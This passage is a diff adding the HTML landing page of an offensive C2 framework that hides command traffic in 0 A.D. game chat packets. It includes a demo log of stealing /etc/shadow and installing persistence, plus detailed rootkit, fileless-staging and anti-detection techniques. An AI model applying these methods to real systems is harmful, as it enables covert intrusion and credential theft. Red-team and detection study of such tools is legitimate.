@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>0adC2 — Command &amp; Control Hidden in Plain Sight</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Gentium+Plus:ital,wght@0,400;0,700;1,400;1,700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet"/>
+<style>
+/* ─────────────────────────────────────────────────────────────────────────
+   0adC2 — landing page
+   Palette inspired by play0ad.com:
+     #480000  imperial red  (nav / header)
+     #2b0000  deep red      (hover / depth)
+     #E7BF47  gold          (borders / accents)
+     #EEE8AA  pale gold     (footer links)
+     #d9d9d9  stone light   (content bg)
+     Background: #111 + noise texture
+───────────────────────────────────────────────────────────────────────── */
+
+:root {
+  --imperial:   #480000;
+  --blood:      #2b0000;
+  --gold:       #E7BF47;
+  --gold-pale:  #EEE8AA;
+  --gold-dim:   rgba(231,191,71,.15);
+  --stone-light:#d4cfc5;
+  --stone-mid:  #bab3a6;
+  --stone-dark: #2a2520;
+  --ink:        #1a1510;
+  --parchment:  #ede6d3;
+  --text:       #2c2520;
+  --link:       #8b0000;
+  --white:      #f5f0e8;
+  --mono:       "JetBrains Mono", "Courier New", monospace;
+  --serif:      "Gentium Plus", Georgia, serif;
+  --sans:       "Helvetica Neue", Arial, sans-serif;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  background: #111 url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3CfeColorMatrix type='saturate' values='0'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23n)' opacity='0.08'/%3E%3C/svg%3E") repeat center top;
+  color: var(--text);
+  font: 15px/1.7 var(--sans);
+  font-weight: 300;
+  -webkit-font-smoothing: antialiased;
+  overflow-x: hidden;
+}
+a { color: var(--link); text-decoration: none; }
+a:hover { text-decoration: underline; }
+
+/* ── GLOBAL TOP BAR (styled after 0ad.com) ───────────────────────────── */
+#global-bar {
+  background: var(--imperial);
+  border-bottom: 2px solid var(--gold);
+  height: 32px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 20px;
+  position: sticky;
+  top: 0;
+  z-index: 200;
+}
+#global-bar .bar-left {
+  font: 700 11px/1 var(--sans);
+  color: var(--gold);
+  letter-spacing: .12em;
+  text-transform: uppercase;
+}
+#global-bar nav a {
+  color: #fff;
+  font: 12px/1 var(--sans);
+  padding: 0 14px;
+  border-left: 1px solid rgba(255,255,255,.2);
+}
+#global-bar nav a:first-child { border-left: none; }
+#global-bar nav a:hover { color: #ccc; text-decoration: none; }
+
+/* ── BRANDING HEADER ─────────────────────────────────────────────────── */
+#branding {
+  background: var(--blood) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='140'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='0'%3E%3Cstop offset='0' stop-color='%23480000' stop-opacity='1'/%3E%3Cstop offset='0.4' stop-color='%232b0000' stop-opacity='1'/%3E%3Cstop offset='1' stop-color='%23480000' stop-opacity='1'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='600' height='140' fill='url(%23g)'/%3E%3C/svg%3E") center center / cover;
+  border-bottom: 3px solid var(--gold);
+  padding: 28px 0 24px;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+}
+#branding::before {
+  content: "";
+  position: absolute; inset: 0;
+  background: repeating-linear-gradient(
+    -45deg,
+    transparent 0, transparent 18px,
+    rgba(231,191,71,.03) 18px, rgba(231,191,71,.03) 20px
+  );
+}
+#branding h1 {
+  font: 900 clamp(2rem, 5vw, 3.4rem) var(--serif);
+  color: var(--gold);
+  letter-spacing: .1em;
+  line-height: 1.1;
+  text-shadow: 0 2px 12px rgba(0,0,0,.6), 0 0 40px rgba(231,191,71,.2);
+  position: relative;
+  z-index: 1;
+  margin-bottom: 6px;
+}
+#branding .tagline {
+  font: italic 400 1.05rem var(--serif);
+  color: rgba(238,232,170,.75);
+  letter-spacing: .06em;
+  position: relative;
+  z-index: 1;
+}
+#branding .dl-btn {
+  display: inline-flex; align-items: center; gap: 10px;
+  margin-top: 20px;
+  background: rgba(0,0,0,.55);
+  border: 2px solid var(--gold);
+  border-color: #CCA655 #864A1E #864A1E #CCA655;
+  color: #eee;
+  padding: 10px 28px 10px 20px;
+  font: 700 14px/1 var(--sans);
+  font-variant: small-caps;
+  letter-spacing: .06em;
+  text-transform: uppercase;
+  position: relative; z-index: 1;
+  transition: background .2s;
+}
+#branding .dl-btn:hover { background: rgba(0,0,0,.35); color: #fff; text-decoration: none; }
+#branding .dl-btn svg { width: 18px; height: 18px; fill: var(--gold); }
+
+/* ── NAVBAR ──────────────────────────────────────────────────────────── */
+#navbar {
+  background: var(--imperial) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4'%3E%3Crect width='4' height='4' fill='%232b0000'/%3E%3Crect width='2' height='2' fill='%23380000' opacity='.5'/%3E%3C/svg%3E") center center;
+  border-bottom: 2px solid var(--gold);
+  border-top: 1px solid #000;
+  display: flex;
+  justify-content: center;
+  height: 36px;
+}
+#navbar a {
+  display: flex; align-items: center;
+  color: #fff;
+  font: 16px/1 var(--serif);
+  padding: 0 22px;
+  height: 100%;
+  border-right: 1px solid rgba(255,255,255,.1);
+  transition: background .15s, color .15s;
+  letter-spacing: .03em;
+}
+#navbar a:first-child { border-left: 1px solid rgba(255,255,255,.1); }
+#navbar a:hover { background: rgba(255,255,255,.08); color: var(--gold); text-decoration: none; }
+#navbar a.active { background: rgba(0,0,0,.3); color: var(--gold); }
+
+/* ── PAGE SHELL ──────────────────────────────────────────────────────── */
+#page { max-width: 1020px; margin: 0 auto; }
+
+/* ── MAIN / SIDEBAR LAYOUT ───────────────────────────────────────────── */
+#main {
+  display: grid;
+  grid-template-columns: 1fr 240px;
+  gap: 24px;
+  padding: 24px 0 40px;
+}
+@media(max-width:780px){ #main{grid-template-columns:1fr} #secondary{display:none} }
+
+/* ── CONTENT CARDS (style .hentry 0ad) ──────────────────────────────── */
+.hentry {
+  background: var(--parchment);
+  border: 1px solid #bbb;
+  margin-bottom: 24px;
+  position: relative;
+}
+.entry-header {
+  background: #f0ece0;
+  border-bottom: 1px solid #ccc;
+  padding: 10px 20px;
+}
+.entry-title {
+  font: 700 22px/1.3 var(--serif);
+  color: var(--text);
+  border-bottom: 2px solid #ccc;
+  padding-bottom: 4px;
+  margin-bottom: 4px;
+}
+.entry-meta {
+  font-size: 11px;
+  color: #888;
+  letter-spacing: .04em;
+  text-transform: uppercase;
+}
+.entry-meta span { color: var(--link); font-weight: 700; }
+.entry-content {
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='8' height='8'%3E%3Crect width='8' height='8' fill='%23ede6d3'/%3E%3C/svg%3E"),
+    url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='8' height='8'%3E%3Crect width='8' height='8' fill='%23ede6d3'/%3E%3C/svg%3E");
+  padding: 16px 20px;
+  color: var(--text);
+}
+.entry-content p { margin-bottom: 12px; font-size: 14.5px; line-height: 1.75; }
+.entry-content h3 {
+  font: 700 17px var(--serif);
+  color: var(--imperial);
+  margin: 20px 0 8px;
+  padding-bottom: 4px;
+  border-bottom: 1px solid #ccc;
+}
+.entry-content ul { list-style: square; margin: 0 0 12px 22px; font-size: 14px; line-height: 1.7; }
+.entry-content li { margin-bottom: 3px; }
+.entry-content a { color: var(--link); font-weight: 700; }
+.entry-content code {
+  font-family: var(--mono);
+  font-size: .82em;
+  background: rgba(0,0,0,.07);
+  padding: 1px 5px;
+  border-radius: 2px;
+  color: #5a0000;
+}
+.entry-content pre {
+  background: #1a1510;
+  border: 1px solid #333;
+  color: #ccc;
+  font-family: var(--mono);
+  font-size: 12px;
+  line-height: 1.8;
+  overflow-x: auto;
+  padding: 14px 16px;
+  margin: 12px 0 16px;
+}
+.entry-content pre .c  { color: #555; }
+.entry-content pre .kw { color: var(--gold); }
+.entry-content pre .ok { color: #6aaf6a; }
+.entry-content pre .rd { color: #c45252; }
+.entry-content pre .pr { color: var(--gold-pale); font-weight: 700; }
+
+/* Feature grid inside entry */
+.feat-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 10px;
+  margin: 12px 0;
+}
+@media(max-width:500px){ .feat-grid{ grid-template-columns:1fr } }
+.feat-item {
+  background: #f8f3e8;
+  border: 1px solid #d0c8b5;
+  padding: 12px 14px;
+}
+.feat-item h4 {
+  font: 700 13px var(--serif);
+  color: var(--imperial);
+  margin-bottom: 6px;
+  text-transform: uppercase;
+  letter-spacing: .05em;
+}
+.feat-item p { font-size: 13px; color: #555; line-height: 1.6; margin: 0; }
+
+/* Wire format table */
+.wire-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 12px 0; }
+.wire-table th {
+  background: var(--imperial);
+  color: var(--gold-pale);
+  font: 700 11px var(--sans);
+  text-transform: uppercase;
+  letter-spacing: .08em;
+  padding: 8px 12px;
+  text-align: left;
+}
+.wire-table td { padding: 8px 12px; border-bottom: 1px solid #d0c8b5; color: #444; }
+.wire-table tr:last-child td { border-bottom: none; }
+.wire-table td:first-child { font-family: var(--mono); color: var(--text); font-weight: 700; font-size: .85em; }
+.wire-table tr:nth-child(even) td { background: rgba(0,0,0,.03); }
+
+.badge { display: inline-block; padding: 2px 7px; font: 700 10px var(--mono); border-radius: 2px; }
+.b-ok   { background: #d4edda; color: #2d6a3f; border: 1px solid #a8d5b5; }
+.b-warn { background: #fff3cd; color: #856404; border: 1px solid #ffc107; }
+.b-open { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+
+/* Detection table */
+.det-table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 12px 0; }
+.det-table th {
+  background: #3a3028;
+  color: var(--gold-pale);
+  font: 700 11px var(--sans);
+  text-transform: uppercase;
+  letter-spacing: .07em;
+  padding: 8px 12px;
+  text-align: left;
+}
+.det-table td { padding: 7px 12px; border-bottom: 1px solid #d0c8b5; font-size: 13px; color: #444; }
+.det-table tr:last-child td { border-bottom: none; }
+.det-table tr:nth-child(even) td { background: rgba(0,0,0,.03); }
+.det-table td:first-child { color: var(--text); font-weight: 700; font-size: 13px; }
+
+/* Map grid for type indicator */
+.type-map {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 6px;
+  margin: 12px 0;
+}
+.type-cell {
+  background: #1a1510;
+  border: 1px solid #333;
+  padding: 10px;
+  text-align: center;
+}
+.type-cell .char { font: 700 1.2rem var(--mono); color: var(--gold); }
+.type-cell .label { font: 400 .72rem var(--mono); color: #888; margin-top: 3px; }
+
+/* Quickstart steps */
+.qs-step {
+  display: flex;
+  gap: 16px;
+  padding: 14px 0;
+  border-bottom: 1px solid #d0c8b5;
+}
+.qs-step:last-child { border-bottom: none; }
+.qs-num {
+  flex-shrink: 0;
+  width: 32px; height: 32px;
+  background: var(--imperial);
+  color: var(--gold);
+  font: 700 14px var(--serif);
+  display: flex; align-items: center; justify-content: center;
+}
+.qs-body h4 { font: 700 14px var(--serif); color: var(--imperial); margin-bottom: 6px; }
+.qs-body p { font-size: 13px; color: #555; margin-bottom: 8px; }
+
+/* Terminal block (hero-like in first entry) */
+.terminal-block {
+  background: #0f0d0a;
+  border: 1px solid #2a2520;
+  border-left: 3px solid var(--imperial);
+  font-family: var(--mono);
+  font-size: 12px;
+  line-height: 1.85;
+  padding: 16px 18px;
+  color: #c0b8a8;
+  overflow-x: auto;
+  margin: 16px 0;
+}
+.terminal-block .t-gold { color: var(--gold); font-weight: 700; }
+.terminal-block .t-red  { color: #c45252; }
+.terminal-block .t-grn  { color: #6aaf6a; }
+.terminal-block .t-dim  { color: #444; }
+.terminal-block .t-prm  { color: var(--gold-pale); font-weight: 700; }
+.terminal-block .t-wh   { color: #e8e0d0; }
+
+/* ── SIDEBAR ─────────────────────────────────────────────────────────── */
+#secondary .widget {
+  background: #222;
+  border: 1px solid #000;
+  color: #fff;
+  margin-bottom: 20px;
+  padding: 10px 12px;
+}
+#secondary .widget-title {
+  font: 700 16px var(--serif);
+  color: #fff;
+  border-bottom: 1px solid #fff;
+  text-transform: uppercase;
+  line-height: 28px;
+  margin-bottom: 8px;
+  letter-spacing: .04em;
+}
+#secondary .widget ul { list-style: none; }
+#secondary .widget li {
+  font-size: 13px;
+  color: #aaa;
+  padding: 3px 0;
+  border-bottom: 1px solid #333;
+}
+#secondary .widget li:last-child { border-bottom: none; }
+#secondary .widget a { color: #fff; font-weight: 700; }
+#secondary .widget a:hover { text-decoration: underline; }
+#secondary .widget .stat-num {
+  display: inline-block;
+  background: var(--imperial);
+  color: var(--gold);
+  font: 700 11px var(--mono);
+  padding: 1px 6px;
+  margin-right: 6px;
+  border-radius: 2px;
+}
+
+/* ── FOOTER ──────────────────────────────────────────────────────────── */
+#colophon {
+  background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40'%3E%3Crect width='40' height='40' fill='%23111'/%3E%3Crect x='0' y='0' width='20' height='20' fill='%23141414'/%3E%3Crect x='20' y='20' width='20' height='20' fill='%23141414'/%3E%3C/svg%3E") repeat;
+  border-top: 3px solid var(--gold);
+}
+#footer {
+  background: rgba(0,0,0,.8);
+  color: #d7d7d7;
+  max-width: 1020px;
+  margin: 0 auto;
+  padding: 20px;
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 20px;
+}
+@media(max-width:600px){ #footer{grid-template-columns:1fr 1fr} }
+.foot-col h4 {
+  font: 700 14px var(--serif);
+  font-variant: small-caps;
+  color: #fff;
+  border-bottom: 1px solid #444;
+  line-height: 30px;
+  margin-bottom: 6px;
+  letter-spacing: .05em;
+}
+.foot-col ul { list-style: none; }
+.foot-col li { font-size: 12px; line-height: 1.8; }
+.foot-col a { color: var(--gold-pale); font-weight: 700; }
+.foot-col a:hover { text-decoration: underline; }
+#footerbar {
+  background: var(--imperial);
+  border-top: 2px solid var(--gold);
+  padding: 6px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+#footerbar p { color: #ccc; font-size: 11px; }
+#footerbar a { color: var(--gold-pale); font-weight: 700; font-size: 11px; }
+
+/* ─── HERO SECTION inside first .hentry ──────────────────────────────── */
+.hero-banner {
+  background: var(--blood) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='200'%3E%3Cdefs%3E%3CradialGradient id='r' cx='50%25' cy='100%25' r='60%25'%3E%3Cstop offset='0' stop-color='%23E7BF47' stop-opacity='0.08'/%3E%3Cstop offset='1' stop-color='transparent'/%3E%3C/radialGradient%3E%3C/defs%3E%3Crect width='600' height='200' fill='url(%23r)'/%3E%3C/svg%3E") center bottom / cover;
+  padding: 32px 24px;
+  text-align: center;
+  border-bottom: 2px solid var(--gold);
+}
+.hero-banner h2 {
+  font: 700 clamp(1.6rem, 4vw, 2.6rem) var(--serif);
+  color: var(--gold);
+  text-shadow: 0 2px 10px rgba(0,0,0,.7);
+  margin-bottom: 8px;
+}
+.hero-banner p {
+  color: rgba(238,232,170,.8);
+  font: italic 400 .95rem var(--serif);
+  margin-bottom: 20px;
+}
+.hero-actions { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+.btn-dl {
+  background: rgba(0,0,0,.55);
+  border: 2px solid;
+  border-color: #CCA655 #864A1E #864A1E #CCA655;
+  color: #eee;
+  padding: 9px 22px;
+  font: 700 13px var(--sans);
+  font-variant: small-caps;
+  letter-spacing: .05em;
+  text-transform: uppercase;
+  transition: background .2s;
+  cursor: pointer;
+}
+.btn-dl:hover { background: rgba(0,0,0,.35); color: #fff; text-decoration: none; }
+.btn-src {
+  background: rgba(255,255,255,.08);
+  border: 1px solid rgba(255,255,255,.25);
+  color: #ddd;
+  padding: 9px 18px;
+  font: 400 13px var(--sans);
+  transition: background .2s;
+}
+.btn-src:hover { background: rgba(255,255,255,.14); color: #fff; text-decoration: none; }
+
+/* ── Static terminal block ───────────────────────────────────────── */
+.sterm {
+  background: #090807;
+  border: 1px solid var(--gold);
+  border-radius: 3px;
+  box-shadow: 0 6px 40px rgba(0,0,0,.8), 0 0 0 1px rgba(231,191,71,.12);
+  overflow: hidden;
+  margin: 18px 0;
+  font-family: var(--mono);
+  font-size: 12.5px;
+}
+.sterm-bar {
+  background: #1c1812;
+  border-bottom: 1px solid #2a2520;
+  padding: 9px 14px;
+  display: flex;
+  align-items: center;
+  gap: 7px;
+}
+.sterm-dot { width: 11px; height: 11px; border-radius: 50%; flex-shrink: 0; }
+.sterm-title { margin-left: 6px; font: 11px var(--mono); color: #555; letter-spacing: .06em; }
+.sterm-body {
+  padding: 18px 20px 22px;
+  color: #c0b8a8;
+  line-height: 1.7;
+  white-space: pre;
+  overflow-x: auto;
+}
+.sterm-body .sg  { color: var(--gold); font-weight: 700; }
+.sterm-body .sn  { color: #6aaf6a; }
+.sterm-body .sy  { color: #f0c040; }
+.sterm-body .sp  { color: var(--gold-pale); font-weight: 700; }
+.sterm-body .sd  { color: #505050; }
+.sterm-body .sw  { color: #e8e0d0; }
+.sterm-caption {
+  font-size: 12px !important;
+  color: #888 !important;
+  font-style: italic;
+  text-align: center;
+  margin-top: 4px !important;
+  margin-bottom: 0 !important;
+}
+
+</style>
+</head>
+<body>
+
+<!-- GLOBAL BAR -->
+<div id="global-bar">
+  <span class="bar-left">0adC2 · Offensive C2 Framework</span>
+  <nav>
+    <a href="#about">About</a>
+    <a href="#features">Features</a>
+    <a href="#steganography">Steganography</a>
+    <a href="#quickstart">Quickstart</a>
+    <a href="#demo">Demo</a>
+    <a href="https://github.com/franckferman/0adC2">GitHub</a>
+  </nav>
+</div>
+
+<!-- BRANDING HEADER -->
+<div id="branding">
+  <h1>0adC2</h1>
+  <p class="tagline">Command &amp; Control hidden inside the dust of ancient battles</p>
+  <a href="https://github.com/franckferman/0adC2" class="dl-btn">
+    <svg viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
+    View on GitHub
+  </a>
+</div>
+
+<!-- MAIN NAVIGATION -->
+<div id="navbar">
+  <a href="#about" class="active">Home</a>
+  <a href="#features">Features</a>
+  <a href="#steganography">Steganography</a>
+  <a href="#quickstart">Quickstart</a>
+  <a href="#detection">Blue Team</a>
+  <a href="https://github.com/franckferman/0adC2/blob/stable/README.md">Docs</a>
+  <a href="https://github.com/franckferman/0adC2/blob/stable/TODO.md">Roadmap</a>
+</div>
+
+<!-- PAGE CONTENT -->
+<div id="page">
+<div id="main">
+
+  <!-- PRIMARY -->
+  <div id="primary">
+
+    <!-- HERO ENTRY -->
+    <article class="hentry" id="about">
+      <div class="hero-banner">
+        <h2>Your C2 traffic, hidden in a strategy game</h2>
+        <p>An open-source offensive framework that conceals encrypted command &amp; control inside the multiplayer network protocol of <em>0 A.D.</em> — a real, publicly available strategy game running on UDP port 20595.</p>
+        <div class="hero-actions">
+          <a href="#quickstart" class="btn-dl">Get Started</a>
+          <a href="https://github.com/franckferman/0adC2" class="btn-src" target="_blank" rel="noopener">Source Code →</a>
+        </div>
+      </div>
+      <div class="entry-content">
+        <p>From a defender's perspective, the agent looks like a spectator connected to a game lobby. Every command, every response, every file transfer rides inside <code>NMT_CHAT</code> packets — the same packets sent when a player types in the in-game chat. The C2 data is encoded in the <em>sender</em> field, which is never displayed in the game UI. The visible chat text is drawn from a pool of natural messages.</p>
+
+        <div class="terminal-block">
+<span class="t-dim">╔══════════════════════════════════════╗</span>
+<span class="t-red">║         0adC2 — Controller          ║</span>
+<span class="t-dim">╚══════════════════════════════════════╝</span>
+<span class="t-dim">Server: </span><span class="t-wh">192.168.1.10:20595</span>  <span class="t-dim">Player: </span><span class="t-wh">Spectator99</span>
+
+<span class="t-gold">[DH]</span>    <span class="t-dim">agent </span><span class="t-gold">3f9a1c02</span><span class="t-dim"> → ECDH init</span>
+<span class="t-grn">[ECDH OK]</span><span class="t-dim"> session key established — XSalsa20-Poly1305 active</span>
+<span class="t-grn">[+]</span>     <span class="t-dim">3f9a1c02 — Linux 6.1 x86_64 uid=0(root) root@target</span>
+
+<span class="t-prm">0adc2&gt;</span> <span class="t-wh">id</span>
+<span class="t-dim">[RSP 3f9a1c02]</span> <span class="t-wh">uid=0(root) gid=0(root) groups=0(root)</span>
+
+<span class="t-prm">0adc2&gt;</span> <span class="t-wh">!dl /etc/shadow</span>
+<span class="t-grn">[DL OK]</span> <span class="t-dim">/etc/shadow → ./shadow (1.2 KB, encrypted in transit)</span>
+
+<span class="t-prm">0adc2&gt;</span> <span class="t-wh">!persist cron</span>
+<span class="t-grn">[OK]</span>    <span class="t-dim">persistence installed via crontab</span></div>
+
+        <h3>Architecture in brief</h3>
+        <div class="feat-grid">
+          <div class="feat-item">
+            <h4>Transport</h4>
+            <p>ENet UDP/20595 — the exact port and protocol of every real 0 A.D. client. No custom port, no raw sockets.</p>
+          </div>
+          <div class="feat-item">
+            <h4>Encryption</h4>
+            <p>X25519 ECDH for session key exchange. XSalsa20-Poly1305 (libsodium secretbox) for all payloads. Ephemeral keys per session.</p>
+          </div>
+          <div class="feat-item">
+            <h4>eBPF Rootkit</h4>
+            <p>Hooks <code>getdents64</code> to hide the PID from <code>/proc</code>. Patches <code>/proc/net/udp</code> reads to remove the C2 port from <code>netstat</code>.</p>
+          </div>
+          <div class="feat-item">
+            <h4>In-Memory Staging</h4>
+            <p>A ~14 KB stager downloads the agent over ECDH-encrypted TCP into a <code>memfd</code> and runs it via <code>fexecve</code> — nothing touches disk.</p>
+          </div>
+        </div>
+      </div>
+    </article>
+
+    <!-- FEATURES -->
+    <article class="hentry" id="features">
+      <div class="entry-header">
+        <div class="entry-title">Capabilities</div>
+        <div class="entry-meta">Implant · Controller · Staging chain</div>
+      </div>
+      <div class="entry-content">
+        <h3>Controller commands</h3>
+        <table class="wire-table">
+          <thead><tr><th>Command</th><th>Effect</th><th>Channel</th></tr></thead>
+          <tbody>
+            <tr><td>&lt;cmd&gt;</td><td>Execute shell command, streamed in 160-byte encrypted chunks</td><td><span class="badge b-ok">ECDH</span></td></tr>
+            <tr><td>!dl &lt;path&gt;</td><td>Download file from the target</td><td><span class="badge b-ok">ECDH</span></td></tr>
+            <tr><td>!ul &lt;local&gt; [remote]</td><td>Upload file to the target</td><td><span class="badge b-ok">ECDH</span></td></tr>
+            <tr><td>!agents</td><td>List connected agents and their ECDH status</td><td>—</td></tr>
+            <tr><td>!target &lt;id|*&gt;</td><td>Select one agent or broadcast to all</td><td>—</td></tr>
+            <tr><td>!jobs / !kill &lt;N&gt;</td><td>List or kill background jobs</td><td>—</td></tr>
+            <tr><td>!persist cron|bashrc|systemd|syscron|profile</td><td>Install persistence mechanism</td><td><span class="badge b-ok">ECDH</span></td></tr>
+            <tr><td>!sleep &lt;N&gt; / !die</td><td>Pause agent or kill and self-delete</td><td><span class="badge b-ok">ECDH</span></td></tr>
+          </tbody>
+        </table>
+
+        <h3>Evasion stack</h3>
+        <ul>
+          <li><strong>Anti-sandbox (12 checks)</strong> — RDTSC, CPUID hypervisor bit, DMI strings, TracerPid, uptime, process count, RAM, LD_PRELOAD, LD_AUDIT, LD_DEBUG, ptrace EPERM, NOP timing</li>
+          <li><strong>Process spoof</strong> — <code>prctl(PR_SET_NAME)</code> → <code>kworker/u4:2</code>, <code>argv[0]</code> overwrite, name pool randomised per build</li>
+          <li><strong>io_uring I/O</strong> — all file and network ops through <code>io_uring</code> syscall interface, invisible to Falco and auditd</li>
+          <li><strong>SilentPulse sleep mask</strong> — XORs the <code>.text</code> section in-place via an <code>mmap RWX</code> stub during idle periods; memory scanners find no code</li>
+          <li><strong>Kill date</strong> — build-time expiry baked in with <code>BUILD_EXPIRE</code>; agent exits silently after that timestamp</li>
+          <li><strong>Per-build IOC polymorphism</strong> — every <code>make fresh_all</code> randomises shared key, player name pool, BPF XOR key, message seed; no two builds share static IOCs</li>
+          <li><strong>Binary-level polymorphism</strong> — <code>make poly_all</code> produces genuinely different x86_64 opcodes each run via 5 combined layers: random CFG method selection (fork variant, exec variant, name-hide variant), dead-code junk stubs referenced via an always-false guard (<code>POLY_CALL_CHAIN</code>) so AV byte-pattern signatures fail, live idempotent junk macros (<code>POLY_LIVE_ALL</code>) inserted at hot call sites that execute unconditionally to defeat dynamic-analysis coverage stripping, GCC seed/alignment flags; consecutive builds share no byte signature in <code>.text</code> and no execution trace pattern</li>
+          <li><strong>Self-delete</strong> — prod build unlinks its own binary on startup (<code>/proc/self/exe</code> via <code>io_uring</code>)</li>
+        </ul>
+      </div>
+    </article>
+
+    <!-- STEGANOGRAPHY -->
+    <article class="hentry" id="steganography">
+      <div class="entry-header">
+        <div class="entry-title">Steganography</div>
+        <div class="entry-meta">NMT_CHAT wire format · Sender field encoding</div>
+      </div>
+      <div class="entry-content">
+        <p>C2 data is encoded in the <strong>sender cstr</strong> field of <code>NMT_CHAT</code> packets. This field is not rendered in the 0 A.D. game UI — it's the internal "sender name" used by the protocol, not shown to other players. The visible <strong>message cstrw</strong> field carries a natural-sounding chat phrase drawn from an XOR-obfuscated pool of 23 messages decoded at runtime.</p>
+
+        <table class="wire-table">
+          <thead><tr><th>Packet field</th><th>C2 packet content</th><th>Plain chat content</th><th>Visible in UI?</th></tr></thead>
+          <tbody>
+            <tr><td>sender cstr</td><td><code>[type 'g'–'n'][body base62]</code></td><td><code>3f2a1b4c-0042-ab3e-…</code> (hex UUID)</td><td><span class="badge b-ok">Hidden</span></td></tr>
+            <tr><td>message cstrw</td><td>"gl hf" / "gg" / "nice one" / …</td><td>same pool, any phrase</td><td><span class="badge b-warn">Visible in chat</span></td></tr>
+          </tbody>
+        </table>
+
+        <h3>Type indicator — sender[0]</h3>
+        <p>The first byte of the sender field encodes the packet type. Real 0 A.D. GUIDs use only <code>[0-9a-f-]</code>, so characters <code>'g'</code>–<code>'n'</code> never appear in a legitimate UUID — zero collision between C2 traffic and real player messages.</p>
+        <div class="type-map">
+          <div class="type-cell"><div class="char">'g'</div><div class="label">DLRQ</div></div>
+          <div class="type-cell"><div class="char">'h'</div><div class="label">CTL</div></div>
+          <div class="type-cell"><div class="char">'i'</div><div class="label">DH</div></div>
+          <div class="type-cell"><div class="char">'j'</div><div class="label">CMD</div></div>
+          <div class="type-cell"><div class="char">'k'</div><div class="label">RSP</div></div>
+          <div class="type-cell"><div class="char">'l'</div><div class="label">KA</div></div>
+          <div class="type-cell"><div class="char">'m'</div><div class="label">DL</div></div>
+          <div class="type-cell"><div class="char">'n'</div><div class="label">UL</div></div>
+        </div>
+
+        <h3>Residual detection surface</h3>
+        <table class="wire-table">
+          <thead><tr><th>Vector</th><th>Condition</th><th>Status</th></tr></thead>
+          <tbody>
+            <tr><td>Sender length &gt; 36 bytes</td><td>UUID is always exactly 36 chars</td><td><span class="badge b-warn">Detectable — multi-chunk planned</span></td></tr>
+            <tr><td>sender[0] ∉ [0-9a-f]</td><td>'g'–'n' outside hex UUID range</td><td><span class="badge b-warn">Detectable — UUID subfield encoding planned</span></td></tr>
+            <tr><td>KA beacon every ~20 s</td><td>Periodic heartbeat pattern</td><td><span class="badge b-ok">Poisson jitter active</span></td></tr>
+            <tr><td>Port 20595, non-0AD PID</td><td>/proc/PID/exe ≠ 0ad binary</td><td><span class="badge b-ok">eBPF network hider</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </article>
+
+    <!-- QUICKSTART -->
+    <article class="hentry" id="quickstart">
+      <div class="entry-header">
+        <div class="entry-title">Quickstart</div>
+        <div class="entry-meta">Linux x86_64 · clang · libsodium · libenet · libreadline · python3 · bpftool</div>
+      </div>
+      <div class="entry-content">
+        <div class="qs-step">
+          <div class="qs-num">I</div>
+          <div class="qs-body">
+            <h4>Clone &amp; verify dependencies</h4>
+            <p>Check that all required libraries are present before building.</p>
+            <pre><span class="c">// clone</span>
+git clone https://github.com/franckferman/0adC2
+cd 0adC2
+<span class="ok">make check_deps</span></pre>
+          </div>
+        </div>
+        <div class="qs-step">
+          <div class="qs-num">II</div>
+          <div class="qs-body">
+            <h4>Configure the stager</h4>
+            <p>Edit <code>config/obf_config.txt</code> with your infrastructure before each build.</p>
+            <pre><span class="c"># staging server</span>
+STAGE_HOST=<span class="kw">10.0.0.1</span>
+STAGE_PORT=<span class="kw">20596</span>
+<span class="c"># 0 A.D. server (C2 relay)</span>
+AGENT_SRV_HOST=<span class="kw">10.0.0.2</span>
